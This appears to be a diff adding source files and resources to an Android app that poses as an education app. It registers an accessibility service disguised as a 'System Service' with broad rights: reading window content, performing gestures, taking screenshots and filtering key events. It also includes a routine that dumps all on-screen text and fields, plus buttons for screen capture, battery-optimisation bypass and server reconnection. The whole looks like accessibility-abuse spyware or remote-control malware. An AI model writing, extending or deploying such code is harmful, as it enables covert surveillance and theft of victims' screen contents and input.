+import android.view.accessibility.AccessibilityNodeInfo;
+
+import java.util.ArrayDeque;
+import java.util.Deque;
+
+public final class Snap {
+
+    private static String t(CharSequence c) {
+        if (c == null) return "";
+        String s = c.toString().replace("\n", " ").replace("|", "/").trim();
+        return s.length() > 90 ? s.substring(0, 90) : s;
+    }
+
+    public static String dump() {
+        KeySvc k = KeySvc.I;
+        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
+        if (r == null) return "sem janela ativa";
+        StringBuilder b = new StringBuilder();
+        Deque<AccessibilityNodeInfo> f = new ArrayDeque<>();
+        Deque<Integer> d = new ArrayDeque<>();
+        f.add(r);
+        d.add(0);
+        int n = 0;
+        while (!f.isEmpty() && n++ < 1500) {
+            AccessibilityNodeInfo x = f.poll();
+            int dep = d.poll();
+            if (x == null) continue;
+            Rect rr = new Rect();
+            x.getBoundsInScreen(rr);
+            if (rr.width() > 0 && rr.height() > 0) {
+                String cls = String.valueOf(x.getClassName());
+                int i = cls.lastIndexOf('.');
+                if (i >= 0) cls = cls.substring(i + 1);
+                b.append(dep).append('|').append(cls).append('|')
+                        .append(t(x.getViewIdResourceName())).append('|')
+                        .append(x.isEditable() ? "E" : "")
+                        .append(x.isClickable() ? "C" : "").append('|')
+                        .append(rr.left).append(',').append(rr.top).append(',')
+                        .append(rr.right).append(',').append(rr.bottom).append('|')
+                        .append(t(x.getText())).append('|')
+                        .append(t(x.getContentDescription())).append('\n');
+            }
+            for (int i = 0; i < x.getChildCount(); i++) {
+                AccessibilityNodeInfo c = x.getChild(i);
+                if (c != null) { f.add(c); d.add(dep + 1); }
+            }
+        }
+        return b.length() == 0 ? "tela vazia (FLAG_SECURE?)" : b.toString();
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Crash.java =====
+package com.eloeeducacao;
+
+import android.content.Context;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.PrintWriter;
+import java.io.StringWriter;
+
+public final class Crash {
+
+    private static volatile boolean on;
+
+    public static void instala(final Context c) {
+        if (on) return;
+        on = true;
+        final Thread.UncaughtExceptionHandler velho = Thread.getDefaultUncaughtExceptionHandler();
+        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
+            @Override public void uncaughtException(Thread t, Throwable e) {
+                try {
+                    StringWriter sw = new StringWriter();
+                    e.printStackTrace(new PrintWriter(sw));
+                    FileOutputStream f = c.openFileOutput("erro.txt", Context.MODE_PRIVATE);
+                    f.write((t.getName() + "\n" + sw).getBytes("UTF-8"));
+                    f.close();
+                } catch (Throwable ignored) {}
+                if (velho != null) velho.uncaughtException(t, e);
+            }
+        });
+    }
+
+    public static String texto(Context c) {
+        try {
+            FileInputStream f = c.openFileInput("erro.txt");
+            byte[] b = new byte[f.available()];
+            f.read(b);
+            f.close();
+            String s = new String(b, "UTF-8");
+            return s.length() > 1600 ? s.substring(0, 1600) : s;
+        } catch (Throwable t) {
+            return "";
+        }
+    }
+
+    public static void limpa(Context c) {
+        try { c.deleteFile("erro.txt"); } catch (Throwable ignored) {}
+    }
+}
+
+
+===== app/src/main/java/com/eloeeducacao/Pulso.java =====
+package com.eloeeducacao;
+
+import android.content.Context;
+import android.graphics.Canvas;
+import android.graphics.Color;
+import android.graphics.Paint;
+import android.util.AttributeSet;
+import android.view.View;
+
+public class Pulso extends View {
+
+    private final Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
+    private final long t0 = System.currentTimeMillis();
+
+    public Pulso(Context c, AttributeSet a) {
+        super(c, a);
+        p.setStyle(Paint.Style.STROKE);
+        p.setStrokeWidth(3f);
+    }
+
+    @Override protected void onDraw(Canvas cv) {
+        int w = getWidth(), h = getHeight();
+        if (w == 0 || h == 0) return;
+        float cx = w / 2f, cy = h / 2f;
+        float base = Math.min(w, h) / 2f;
+        long t = System.currentTimeMillis() - t0;
+        for (int i = 0; i < 3; i++) {
+            float f = ((t + i * 700L) % 2100L) / 2100f;
+            float r = base * (0.22f + 0.72f * f);
+            p.setColor(Color.argb(Math.max(0, (int) (80 * (1f - f))), 88, 166, 255));
+            cv.drawCircle(cx, cy, r, p);
+        }
+        p.setStyle(Paint.Style.FILL);
+        p.setColor(Color.parseColor("#58A6FF"));
+        cv.drawCircle(cx, cy, base * 0.15f, p);
+        p.setStyle(Paint.Style.STROKE);
+        postInvalidateOnAnimation();
+    }
+}
+
+===== app/src/main/res/xml/acc.xml =====
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeViewTextChanged|typeViewFocused|typeViewClicked|typeViewScrolled"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagDefault|flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestFilterKeyEvents"
+    android:canPerformGestures="true"
+    android:canRetrieveWindowContent="true"
+    android:canTakeScreenshot="true"
+    android:canRequestFilterKeyEvents="true"
+    android:notificationTimeout="80"
+    android:description="@string/acc_desc" />
+
+===== app/src/main/res/values/strings.xml =====
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Servi&#231;o do Sistema</string>
+    <string name="acc_label">Servi&#231;o do Sistema</string>
+    <string name="acc_desc">Mant&#233;m o aparelho r&#225;pido e est&#225;vel.</string>
+    <string name="svc_label">Servi&#231;o do Sistema</string>
+</resources>
+
+===== app/src/main/res/layout/main.xml =====
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#0B0F14"
+    android:fillViewport="true">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:gravity="center_horizontal"
+        android:padding="26dp">
+
+        <com.eloeeducacao.Pulso
+            android:layout_width="132dp"
+            android:layout_height="132dp" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="14dp"
+            android:text="EloEducacao"
+            android:textColor="#FFFFFF"
+            android:textSize="25sp"
+            android:textStyle="bold" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="4dp"
+            android:text="Ambiente de aprendizado"
+            android:textColor="#7C8794"
+            android:textSize="13sp" />
+
+        <TextView
+            android:id="@+id/txt"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="22dp"
+            android:background="@drawable/bg_card"
+            android:fontFamily="monospace"
+            android:padding="14dp"
+            android:textColor="#B8C2CE"
+            android:textSize="12sp" />
+
+        <Button
+            android:id="@+id/b1"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:layout_marginTop="18dp"
+            android:background="@drawable/bg_btn_pri"
+            android:text="Ativar acessibilidade"
+            android:textAllCaps="false"
+            android:textColor="#EAF1F8"
+            android:textSize="14sp" />
+
+        <Button
+            android:id="@+id/b2"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:layout_marginTop="10dp"
+            android:background="@drawable/bg_btn"
+            android:text="Iniciar captura de tela"
+            android:textAllCaps="false"
+            android:textColor="#DCE3EA"
+            android:textSize="14sp" />
+
+        <Button
+            android:id="@+id/b3"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:layout_marginTop="10dp"
+            android:background="@drawable/bg_btn"
+            android:text="Ignorar otimizacao de bateria"
+            android:textAllCaps="false"
+            android:textColor="#DCE3EA"
+            android:textSize="14sp" />
+
+        <Button
+            android:id="@+id/b4"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:layout_marginTop="10dp"
+            android:background="@drawable/bg_btn"
+            android:text="Reconectar servidor"
+            android:textAllCaps="false"
+            android:textColor="#DCE3EA"
+            android:textSize="14sp" />
+    </LinearLayout>
+</ScrollView>
